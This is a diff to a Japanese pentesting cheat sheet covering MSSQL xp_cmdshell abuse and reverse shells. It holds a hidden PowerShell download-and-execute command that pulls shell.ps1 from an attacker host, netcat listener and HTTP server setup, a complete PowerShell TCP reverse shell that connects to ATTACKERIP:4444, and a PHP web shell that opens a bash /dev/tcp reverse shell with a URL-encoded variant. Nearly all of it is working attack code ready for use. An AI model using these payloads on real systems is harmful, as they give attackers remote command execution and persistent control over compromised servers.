@@ -155,6 +155,38 @@ EXEC xp_cmdshell 'whoami';
 ### ✅【7】リバースシェル投下例（ネットワークが許せば）
 EXEC xp_cmdshell 'powershell -NoP -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKERIP/shell.ps1'')"';
 
+## 🔴サーバ
+### リバースシェル待ち受け
+nc -lvnp 4444
+
+### HTTP サーバ
+cd ~/www
+python3 -m http.server 80
+
+### リバースシェル
+#### shell.ps1 
+```
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKERIP",4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+  $sendback = (iex $data 2>&1 | Out-String );
+  $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+  $stream.Flush()
+}
+```
+#### payload.php
+
+```
+<?php system("bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:4444 0>&1'"); ?>
+
+#Reverse Shell 
+#payload.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/xxx.xxx.xxx.xxx/4444+0>%261'
+```
+
 
 ## 🔴tools
 
